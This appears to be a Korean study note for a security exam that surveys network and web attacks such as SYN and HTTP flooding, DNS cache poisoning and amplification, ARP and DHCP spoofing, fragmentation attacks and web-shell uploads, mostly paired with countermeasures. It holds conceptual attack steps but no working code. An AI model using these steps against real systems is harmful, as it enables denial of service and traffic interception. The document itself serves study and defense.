- 콘텐츠 일정횟수에 의한 임계치 설정 : 특정 콘텐츠 다량 요청하는것이므로, IP 마다 콘텐츠 요청횟수 임계치 설정
- 시간대별 웹 페이지 URL 접속 임계치 설정 차단 : 시간대별 임계치를 설정하여 임의의 시간안에 설정한 임계치 이상의 요청 들어온경우 해당 IP 탐지하여 방화벽에 등록
- Web Scraping 기법을 이용한 차단: L7 스위치 운영하는 경우 웹 스크랩핑 기능 사용하여 요청 패킷에 대한 쿠키 값이나 자바스크립트 보내어 클라이언트 원하는 값에 재요청 패킷이 없는 경우 해당 패킷 차단

<br>
<br>

### ㅁ Slow HTTP GET Flooding
: 위의 공격과 차이점으로 HTTP Header 변조 해야함.

HTTP Header에는 Content Length 가 이쓴ㄴ데 이값을 50,000 으로 변경후 1바이트씩 천천히 전송하는것.


<br>
<br>

### ㅁ TCP Syn Flooding

\# TCP 3 way handshaking의 취약점을 이용하여 Backlog Queue가 초과하도록 만드는 공격이다.

1)존재하지 않는 출발지 IP를 가진 패킷을 다량 보냄.

2)서버는 각 패킷에 대한 SYN/ACK 응답을 보냄.

3)서버는 응답으로 보낸 SYN에 대한 클라이언트의 ACK를 무한정 기다림.

4)이런식으로 계속 SYN 패킷을 보내어 Victim의 Backlog Queue를 초과하도록 만들어서 서비스 불가상태로 만든다.

<대응법>

- Backlog Queue크기를 늘려준다.
- System 보안 패치를 한다.
- SYN Cookie를 이용한다.
- IDS, IPS에서 정형화된 SYN Flooding 패킷을 탐지한다.
- SYN 쿠키 사이즈 증가
- 중간 게이트웨이에서 SYN이 지나간 후에 ACK가 이루어지지 않으면 서버로 RST(연결 리셋)를 보내게 한다.


<br>
<br>

### ㅁ TCP Connection Flooding

: TCP Connection Flooding 은 TCP 3-Way Handshake 과정을 과도하게 유발함으로써 서비스의 과부하를 야기시키는 공격 유형이다.

공격 트래픽을 수신하는 서버는 정상적인 TCP 세션을 지속적으로 세션 연결을 하여 서비스를 위하여 수행하는 서버의 세션 처리 자원(Resource)를 고갈시켜 정상적인 세션 연결을 더 이상 수행하지 못하게 한다. 결국 정상적으로 접근하는 사용자가 더 이상 서비스에 접근할 수 없게 된다. 이 공격 기법을 세분화하면 크게 세 가지로 나눠볼 수 있다.

1. TCP 세션 연결을 유지하는 DDoS 공격
2. TCP 세션 연결/해제를 반복하는 DDoS 공격
3. TCP 세션 연결 후 정상적인 트랜잭션(Transaction)처럼 보이는 트래픽을 발송하는 DDoS 공격

- 한 개의 ip가 다양한 포트로 SYN 패킷을 전송한다.
- 클라이언트와 서버는 3 Way-handshake를 통해 세션을 연결한다
- 세션 연결이 Full이 되면 더 이상 연결이 불가능하다.


***
#### DNS 관련 공격
***

### ㅁ DNS Spoofing Attack
: 희생자가 DNS 질의를 수행하면 공격자가 이를 스니핑하고 있다가 ​정상 응답보다 빠르게 ​희생자에게 조작된 IP 정보가 담긴 DNS 응답을 보내 정상 주소(URL)을 입력하더라도 조작된 주소로 접속하게 하는 공격기법.

조작된 응답 이후에 도착한 정상 응답은 먼저 수신한 응답을 신뢰하는 특성으로 폐기 된다.

- 대응방법
1. 사전에 스니핑이 되어야 되기 때문에 스니핑 탐지 및 차단       
2. 중요한 사이트의 IP 주소에 대해서는 DNS 질의보다 우선순위가 높은 hosts 파일에 등록해서 관리

<br>
<br>

### ㅁ DNS 캐시 포이즈닝 (Cache Poisoning)

: DNS 서버는 상위 서버에게 빈번하게 반복적인 질의 (Iterative Query)를 요청하여 부하 발생을 막기 위해 캐시(Cache)를 사용한다.

이 캐시는 TTL(Time To Live) 동안만 유지된다.

DNS 서버 자체를 공격하는 것이기에 DNS 캐시정보가 일정시간(TTL) 유지 되는 동안 해당 서버에 접근하는 다수의 사용자들이 DNS 응답을 수신하게 된다.

- 공격방법

1. 공격자가 공격 대상의 DNS 서버에 조작할 도메인에 대해서 존재하지 않는 서브도메인 주소로 Recursive 질의를 다수 보낸다. 예를 들어서 q001.bankofamerica.com              
2. DNS 서버는 질의에 대한 IP 주소가 없기 때문에 bankofamerica.com에 질의를 하므로써 반복적인 질의(Recursive Query)를 수행한다.           
3. bankofamerica.com 네임서버에서 NXDOMAIN이라는 응답이 오기 전, 공격자는 www .bankofamerica.com의 IP주소를 공격자가 원하는 IP주소로 조작한 수 많은 응답을 DNS 서버에 보낸다.          
4. DNS 서버는 조작된 응답을 받아들이고, 캐시에 저장한다.         
5. 일반 사용자들이 DNS 서버에  www .bankofamerica.com의 IP 주소에 대해 질의를 한다.          
6. DNS 서버는 조작된 IP주소를 응답해준다.          
7. 일반 사용자들은 진짜 bank of america 웹사이트와 비슷한 조작된 주소로 접속하게된다.       

- 대응방법

1. 네임서버의 소프트웨어를 최신 버전 상태로 유지   
2. 도메인 관리용 DNS 서버는 재귀적 질의를 허용하지 않도록 설정하고, 제한된 사용자가 사용하는 Recursive DNS 서버라면 해당 사용자로 제한해서 허용하도록 한다.   
3. allow-recursion 설정: DNS 서버는 기본 설정으로 모든 IP에 대해서 재귀적 질의를 허용한다.
4. 모든 재귀적 질의 차단: allow-recursion {none;​}; 으로 설정하거나 recursion no로 설정   
5. 제한된 사용자만 사용: allow-recursion {IP 또는 IP대역;}; 또는 별도의 acl (access control list)를 정의
6. DNSSEC 기술 활용: IETF에 의해 2005년 완성된 국제표준기술로, 데이터 위변조 공격에 취약한 DNS의 문제점을 근본적으로 보안 개선하기 위함.    

\# DNS대체하는 것이 아니라, 기존의 DNS에 공개키 암호화 방식의 보안 기능을 추가 부여하여 DNS의 보안성을 대폭 강화

<br>
<br>

### ㅁ DNS를 활용한 증폭 DrDoS
\# DrDOS 정의 
: 출발지 IP를 공격대상의 IP로 위조한 후 다수의 반사서버에 요청하면 공격대상은 반사서버로부터 대량의 응답을 받아 서비스 거부 상태가 된다.

- DNS DrDos 과정

1. 우선, source IP주소를 희생자의 IP주소로 스푸핑을 합니다.    
2. 공격자는 DNS서버(open된 resolving DNS)에 any 또는 txt와 같은 요청에 비해 응답의 크기가 큰 쿼리(query)를 보냅니다.   
3. DNS 서버는 query에 대한 응답을 희생자에게 보냅니다.   
4. 그 결과, 희생자는 매우 큰 사이즈의 응답을 받게 됩니다.    
5. 공격자 입장에서, 작은 크기의 패킷을 큰 사이즈의 패킷으로 증폭하여 공격할 수 있어 효율적인 공격방법이다.    

- 대응방법

1) 포트기반의 ACL 차단
   - DNS의 경우 UDP를 사용하기 때문에 protocol 기반의 ACL은 적용하기 힘들다   
   - 공격 트래픽이 DNS 서버에서 응답패킷이므로 소스포트는 53, 응답포트는 53 또는 1024 이상의 랜덤 포트가 된다. 따라서 소스포트가 53/udp인 inbound 트래픽을 차단하는 ACL 적용   
   - 
2) 공격 IP는 resolving이 허용된 DNS 서버에서 지속적인 공격 트라픽이 유발되므로 ratelimit를 적용하여, 한 소스 IP에서의 inbound 트래픽을 제한하도록 한다. 

3) 수십~수백Gbps의 충분한 대역폭이 없다면 KISA 대피소 서비스를 활용하거나 Anycast등의 대응이 가능한 Cloud 기반의 서비스를 이용


<br>
<br>

---



### ㅁ 회선 태핑(Tapping) 공격
: 전기 신호를 직접 자신에게 끌어오는 방식

- 대응 방법 : 광섬유(광섬유는 어떤 유형의 신호도 외부로 방출할 수 없게 설계되어 있어 전기 신호를 직접 끌어오는 것을 방지할 수 있다.)

<br>

### ㅁ 템페스트(Tempest) 공격
: 전송 매체에 흐르는 전기 신호를 검출해 데이터를 해석하는 기법으로 무선분야에서 광범위하게 일어난다.

Ex) 워 드라이빙(war driving) 공격, PC스피커의 전기 신호를 이용한 공격 등

<br>

### ㅁ VLAN 홉핑 공격
: 자신과 다른 VLAN영역으로 넘어가는 기법

VLAN영역은 논리적으로 다른 영역이기 때문에 원래는 넘어갈 수 없다. 이를 무시하고 다른 VLAN 영역으로 넘어갈 때 사용하는 공격이다.

<br>

### ㅁ 본크·보인크(Bonk·Boink) 공격
: TCP 단편화 속성을 악용해 TCP 헤더 중 일련번호 항목을 조작해 수신 측에서 정상적인 재조립을 할 수 없도록 하여 과부하를 일으키는 기법

- bonk: 같은 시퀀스 번호 보내는것
- boink: 정상적으로 보내는 것처럼 보내다가 bonk로 공격하는것.
- teardrop: 패킷 1의 시퀸스 번호를 1 ~ 101로 보내고, 패킷 2의 시퀸스 번호를 81 ~ 181 로 보내는 식


티얼드롭 공격처럼 대부분읜 운영체제는 일련번호 항목이 일정 시간동안 불일치할 경우, 해당 세그먼트 전체를 폐기하는 방식으로 해당 공격을 차단한다.

<br>

## Tear drop 공격 종류 : Tiny fragment attack, fragment overlap attack

### ㅁ Tiny Fragment Attack
: 최초의 패킷 조각을 아주 작게 만들어 네트워크 침입탐지 시스템(IDS)이나 패킷 필터링 장비를 우회하는 공격을 말합니다.

패킷 필터링 장비나 침입탐지시스템은 필터링을 결정하기 위해 포트번호를 확인하는데 포트번호가 포함되지 않을 정도로 아주 작게 단편화된 첫 번째 조각을 통과시킵니다.

또한 실제 포트번호가 포함되어 있는 두 번째 조각은 아예 검사도 하지 않고 통과시킵니다.

그 결과 보호되어야 할 목적지 서버에서는 이 패킷들이 재조합되어 공격자가 원하는 포트의 프로그램으로 무사히 연결될 수 있습니다.

이런 방법으로 패킷 필터링에서 차단되어야 하는 패킷을 통과시킬 수도 있고, 침입 탐지 시스템에서 비정상적인 접속으로 경보 되어져야 하지만 전혀 탐지되지 않게 할 수도 있습니다.

<br>

### ㅁ Fragment Overlap Attack 
: tiny fragment attack 보다 더욱 정교한 공격으로 첫 번째 조각에서는 필킷 필터링 장비에서 허용하는 http 포트와 같은 포트번호를 가집니다. 

그리고, 두 번째 조각에서는 오프셋을 아주 작게 조작합니다.    

방화벽은 정상적인 포트로 오인하여 패킷을 호스트에게 전달하도록 허락합니다.

조각들이 재조합 될 때 두 번째 조각과 첫 번째 조각의 일부분을 덮어쓰도록 하여 공격이 성공합니다.


## I Fragmentation 을 이용한 서비스 거부 공격 : ping of death, Tear drop

<br>

### ㅁ Ping of death    
: ICMP Packet을 정상적인 크기보다 아주 크게 만들어 Fragmented Packet 과 비정상적인 OOB(Out of Band)를 함께 대량으로 전송하여, 해당 시스템 자원을 소모시키는 공격

패킷은 MTU(Maximun Tranmission Unit)의 크기를 넘을 수 없기 떄문에 1,500 바이트 설정 되어있음. 이러면 1,500 바이트를 기준으로 나눠 전송하여 그 나눠진 부분을 Offset로 표현해줌

그냥 ㅈㄴ 큰 icmp packet 계속 보내는것.

### Tear drop
: fragment 재조합 과정의 취약점을 이용한 공격으로, TCP Header 부분의 offset field 값이 중첩되는 데이터 패킷을 대상시스템에 전송


<br>

### ㅁ 세션 하이재킹
: 클라이언트와 서버간의 통신을 관찰 할 수 있을 뿐만 아니라 신뢰를 이용한 세션은 물론, Telnet, FTP 등 TCP를 이용한 거의 모든 세션의 갈취가 가능합니다.

현재 연결중인 세션을 가로채어 사용자의 ID와 패스워드를 사용하는 인증 절차를 무시할 수도 있습니다. 


<br>

### ㅁ Smishing
:  문자 메시지(SMS)에 링크를 거는 등 문자 메시지를 이용해 사용자의 개인 신용 정보를 빼내는 수법

<br>

### ㅁ Spear Phishing
: 사회 공학의 한 기법으로, 인간 상호 작용의 깊은 신뢰를 바탕으로 특정 대상을 선정한 후 메일의 링크나 파일을 클릭하도록 유도한 뒤 개인 정보를 탈취하는 수법

<br>

### ㅁ Qshing
: QR코드와 개인정보 및 금융정보를 낚는다(Fishing)의 합성 신조어

<br>
<br>

***              
#### ㅁ 파일 업로드 공격                 
: 공격자는 웹 애플리케이션의 파일 업로드 기능을 이용, 웹쉘이라고 하는 악성 파일을 업로드, 시스템 명령을 실행                   
- 파일 업로드 취약점 : 파일을 업로드하는 기능에 적절한 보안 대책이 적용되어 있지 않을 때 발생                
Ex. 게시판에 파일을 첨부/사용자 프로필에 사진을 업로드, SNS 사진/파일 업로드도 포함됨                                   
- 파일 업로드 기능 구현 시 아무 파일이나 업로드 허용                                 
  => 공격자는 웹쉘(web shell)이라고 하는 악성 파일 업로드 => 시스템 침투                 
* 커맨드 인젝션 공격과 유사: 웹을 통해 시스템 명령어를 실행할 수 있는 웹 페이지의 일종(그래서 이름이 웹쉘)                   

- 다운로드한 webshell.php 파일                   
 
   -> 명령어를 입력받는 폼 제공 + 명령어를 cmd 파라미터로 전달      
   -> system() 함수를 이용하여 명령어 실행

[<파일 업로드 공격 예시>](https://c0msherl0ck.github.io/web/post-file_upload_attack/)

<br>

#### ㅁ John The Ripper    
: 다양한 패스워드 형식을 가지는 파일을 점검하는 도구지만, 패스워드 크래커로 사용되는 도구.

<br>

#### ㅁ 스턱스 넷
: 원자력 발전소 작동을 방해한 악성코드 SCADA(Supervisory Control And Data Acquisition)시스템을 임의로 제어하는데 사용. 

내부 폐쇄망에서 다른 시스템들로 유포하기 위해 여러 개의 취약점을 사용했다.   

독일 지멘스 소프트웨어 구조를 정확하게 파악하여 관련 파일을 변조했다.

<br>


#### ㅁ ARP Spoofing
: ARP 프로토콜을 이용하여 동일 네트워크에 존재하는  Victim의 ARP 테이블에서 Victim의 IP에 대한 MAC주소를 Attacker자신의 MAC주소로 바꾸는 공격이다.

- 로컬 통신 과정에서 서버와 클라이언트는 IP 와 MAC 주소로 통신을 수행
- 클라이언트 MAC 주소를 중간에 공격자가 자신의 AMC 주소로 변조하여 마치 서버와 클라이언트가 통신하는것처럼 속이는 공격. 이러한 공격은 fragrouter를 통하여 연결이 끊어지지 않도록 Release를 해줘야 한다.

ㅁ ARP Spoofing 특징

- ARP는 인증을 하지않기 떄문에 ARP Reply 패킷을 각 호스트에 보내서 쉽게 ARP Cache를 업데이트 한다.
- 즉, 변조된 ARP Reply를 지속적으로 보내서 각 호스트들의 ARP Cache에 변조된 MAC 주소정보를 계속 유지 시켜야 한다.
  
<대응 방안>

- ARP Table을 정적(Static)으로 설정 한다.


<br>

#### ㅁ ARP Redirect
: ARP Spoofing에서 속이는 대상을 게이트웨이로 한 것이다.

 Victim은 Attacker가 Gateway인 줄 알고 외부로 통신할 때 Attacker에게 패킷을 보내기 때문에 외부로 나가는 패킷을 Sniffing할 수 있다.

<br>

#### ㅁ ICMP Redirect
 : 라우터가 송신 측 호스트에 적합하지 않은 경로로 되어 있으면 해당 호스트에 대한 최적 경로를 다시 지정해주는 ICMP Type (이를 악용하면 패킷을 가로채는 것이 가능.)


<br>



### ㅁ Smurf Attack

: Attacker가 출발지 IP를 Victim의 IP로 Spoofing하여 ICMP Request패킷을 시스템이 아주 많은 네트워크를 Broadcast하면 해당 패킷을 받은 네트워크가 Victim에게 ICMP Reply패킷을 대량으로 보내는 공격이다.

<대응법>

- 라우터에서 Direct Broadcast를 차단한다. (대부분의 라우터에서 이미 Default로 차단되어 있다.)


<br>
<br>



<br>
<br>

### ㅁ Land Attack(Local Area Network Denial Attack)

: 대량의 패킷의 출발지 IP주소와 목적지 IP 주소를 같게 만들어서 Victim에게 보내는 공격이다.

공격자는 공격대상 시스템의 IP 주소로 출발지주소를 변경한(Spoofed) TCP SYN 패킷을 보냅니다.

패킷을 받은 시스템은 TCP SYN-ACK을 자신에게 보내개 되고 유휴시간제한(Idel timeout)까지 빈 연결만듬

이과정 반복하여 시스템에는 빈 연결 계속 쌓여 시스템 버퍼 범람하여 서비스거부(DOS) 상태가 되빈다.

<대응법>

- 출발지 IP 주소와 목적지 IP 주소를 확인하여 동일한 패킷은 버린다. (현재 대부분의 시스템은 이미 적용하고 있다.)
- 라우터나 방화벽에서 출발지 IP 주소와 내부 IP주소가 동일한 패킷은 차단한다.

<br>
<br>


### ㅁ DHCP 스푸핑 공격(DHCP Spoofing Attack)
: 공격자가 가짜 DHCP 서버의 역할을 수행하면서  Client가 IP 주소를 요청할 경우 자신의 IP 주소를  Gateway 혹은 DNS 서버의 주소로 속여서 전달하는 공격이다.
  
결과적으로 Client가 외부와 통신하는 모든 트래픽을 자신의 Gateway 즉 공격자에게 전송하기 때문에 MITM(Man In The Middle) 공격으로 패킷을 sniffing하거나 변조하는 것이 가능하다.


<br>


<br>
<br>

### ㅁ DHCP Starvation

: DHCP는 MAC 주소 기반으로 클라이언트에게 IP를 할당 공격자는 이점을 이용하여 공격자가 MAC Address를 계속 변경하여 

DHCP Server로부터 IP를 할당받아서 DHCP Server가 보유하고 있는 모든 IP 주소를 할당받아 정작 정상적인 호스트가 IP를 할당받지 못하게 하는 방식이다.

<대응법>

- port security기능을 사용한다.
 
: port security기능을 사용하면 해당 MAC Address에게만 IP를 할당하거나 해당 Port에 최대로 줄 수 있는 IP개수를 제한할 수 있다.




<br>
<br>

### ㅁ Hash Dos

: 클라이언트에서 전달되는 각종 파라미터 값을 관리하는 해시테이블의 인덱스 정보가 중복되도록 유도하여 사전에 저장된 정보 조회 시 많은 CPU 자원을 소모하도록 하는 공격

- HTTP Request 요청 시 Get, Post 방식으로 전송되는 변수를 Hash 구조로 관리
- 많은 수의 매개변수 전달하면 매개변수를 저장하는 해시테이블에서 해시 충돌이 발생하여 해시테이블에 접근 하는 시간 증가
- 해시테이블(Hash Table) : 해시함수가 서로 다른 두개의 입력 값에 대해 동일한 출력값 도출
- 해시 충돌(Hash Collision) : 서로 다른 키 값이 같은 인덱스 값으로 매핑되는 현상

<대응방안>

- HTTP Post 파라미터 수 제한 : Tomcat, PHP, Ruby 등 최신 버전은 파라미터 수 제한 가능
- Post 메세지 크기 제한
- PHP 에서 Hash Dos 차단

### ㅁ  Hulk Dos

: 웹 서버의 가용량을 모두 사용하여 정상적인 서비스가 불가능하도록 하는 Get Flooding의 공격 유형

- 공격 대상 URL을 지속적으로 변경하여 DDoS 차단 정책을 우회하는 특징 가짐
- 특정 URL이 계속 변경하면 임계치 설정 기반 방어가 불가능하게 된다.

---

### ㅁ Dos vs DDoS vs DRDOS

![image](https://user-images.githubusercontent.com/62640332/161936788-f86ecaf9-1375-4d08-baad-1312c43f7943.png)


---

[DoS]
![image](https://user-images.githubusercontent.com/62640332/138556466-a7ab272f-1125-4951-a421-ff8277e7cb37.png)

[DDOS] 
![image](https://user-images.githubusercontent.com/62640332/138556495-bc84ebbb-4277-417f-88fc-a65ae14337f2.png)

[DrDoS] 
![image](https://user-images.githubusercontent.com/62640332/138556534-1a72e70f-49cb-45d8-8031-fbe2f096dc83.png)

---


<br>
<br>

ㅁ DOS(Denial of Service)공격

- 타겟 시스템의 자원을 고갈 시키거나 네트워크 대역폭을 초과시켜 원래 의도된 용도로 사용하지 못하게 하는 공격이다. (가용성을 침해한다.)
- DDOS와의 차이점은 Attacker가 직접 공격을 수행한다는 점이다.


<br>

ㅁ DDOS(Distributed DoS)

- Attacker가 여러 대의 컴퓨터를 감염시켜 동시에 한 타겟 시스템을 집중으로 공격하는 방법이다.
- 짧은 시간 안에 서버를 마비시킬 수 있으며 Dos보다 치명적이다.
- DOS와의 차이점은 실질적인 Attacker가 아닌 Attacker가 감염시킨 좀비 PC가 공격을 수행한다는 점이다.

<br>

ㅁ DRDOS(Distributed Reflection DoS)

- DDOS보다 발전된 공격이다.
- Attacker는 출발지 IP를 Victim의 IP로 Spoofing한 SYN 패킷을 반사 서버로 대량으로 전송하여 이를 받은 반사 서버가 Victim에 SYN/ACK을 보내 홍수를 일으켜 Victim을 다운시킨다. (ICMP 프로토콜의 Request/Reply를 이용하기도 한다.)
- 별도의 Agent 없이 TCP Half open 취약점을 이용하는 기법


<br>
<br>

---

<구성 요소>

- Attacker : 공격자
- Master(C&C) : Attacker에게 명령을 받는 시스템
- Agent : Master의 명령을 받아 직접 공격하는 시스템
- Victim : 희생자

<br>
<br>


ㅁ 공격 도구

1. TRINOO

- UDP Flood 서비스 방해 공격을 실행.
- 공격자가 마스터 서버에게 tcp 27665번 포트를 이용하여 명령.
- 마스터 서버는 데몬(Slaves)들에게 udp 27444번 포트를 이용하여 명령.

<br>
<br>

2. TFN

- UDP, SYN, ICMP 공격 모두 가능하다.
- 데몬 IP들을 숨기기 위한 암호화 사용.
- 16bit echo reply를 이용하여 통신.

<br>
<br>

3.TFN2K

- TFN의 업그레이드 버전.
- 5개의 DOS 공격 기능이 추가되었다.
- 클라이언트/서버 모듈단위 동작 수행.

<br>
<br>

4. Stacheldraht(슈탁셀드라트)

- 공격자와 마스터 사이의 통신에 암호화 기능을 추가.(TCP 세션 하이재킹과 같은 도청 불가.)



<br>
<br>

---
